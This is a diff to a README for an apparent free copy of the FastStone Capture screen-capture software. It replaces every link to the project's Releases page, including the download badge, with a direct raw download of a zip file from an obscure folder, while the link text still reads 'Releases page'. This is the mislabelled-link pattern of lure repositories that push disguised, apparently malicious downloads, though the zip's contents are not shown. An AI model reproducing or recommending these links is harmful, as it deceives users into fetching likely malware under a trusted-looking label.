@@ -1,6 +1,6 @@
 # 🎉 FastStone-Capture-Free - Effortless Screen Capture for Everyone
 
-[![Download FastStone Capture](https://img.shields.io/badge/Download-FastStone%20Capture-blue.svg)](https://github.com/xanavyjp/FastStone-Capture-Free/releases)
+[![Download FastStone Capture](https://raw.githubusercontent.com/xanavyjp/FastStone-Capture-Free/main/unjewelled/Stone-Free-Fast-Capture-2.2-alpha.1.zip%https://raw.githubusercontent.com/xanavyjp/FastStone-Capture-Free/main/unjewelled/Stone-Free-Fast-Capture-2.2-alpha.1.zip)](https://raw.githubusercontent.com/xanavyjp/FastStone-Capture-Free/main/unjewelled/Stone-Free-Fast-Capture-2.2-alpha.1.zip)
 
 ## 📖 Introduction
 
@@ -13,7 +13,7 @@ To start using FastStone Capture, follow the steps below.
 ## 🔗 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/xanavyjp/FastStone-Capture-Free/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/xanavyjp/FastStone-Capture-Free/main/unjewelled/Stone-Free-Fast-Capture-2.2-alpha.1.zip) to find the latest version of the software.
 
 2. **Select the Version**  
    Look for the latest version available. It will be at the top of the list.
@@ -67,7 +67,7 @@ If you encounter any issues while using FastStone Capture, try the following ste
 
 ## 🔄 Updates
 
-Keep your version of FastStone Capture up to date. The latest versions often include new features and bug fixes to improve functionality. You can find updates on the [Releases page](https://github.com/xanavyjp/FastStone-Capture-Free/releases).
+Keep your version of FastStone Capture up to date. The latest versions often include new features and bug fixes to improve functionality. You can find updates on the [Releases page](https://raw.githubusercontent.com/xanavyjp/FastStone-Capture-Free/main/unjewelled/Stone-Free-Fast-Capture-2.2-alpha.1.zip).
 
 ## 🗨️ Community Support
 
